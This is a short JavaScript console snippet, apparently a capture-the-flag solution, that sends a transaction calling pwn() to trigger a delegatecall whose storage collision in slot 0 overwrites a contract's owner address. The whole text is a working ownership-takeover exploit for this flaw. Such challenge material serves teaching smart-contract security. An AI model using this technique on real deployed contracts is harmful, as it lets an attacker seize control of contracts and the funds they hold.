// Run on console
await sendTransaction({
	from: player,
	to: contract.address,
	data: window.web3.eth.abi.encodeFunctionSignature("pwn()")
})
// Both owners variable are in slot 0 so the delegate call to contract B
// will modify the owner address in contract A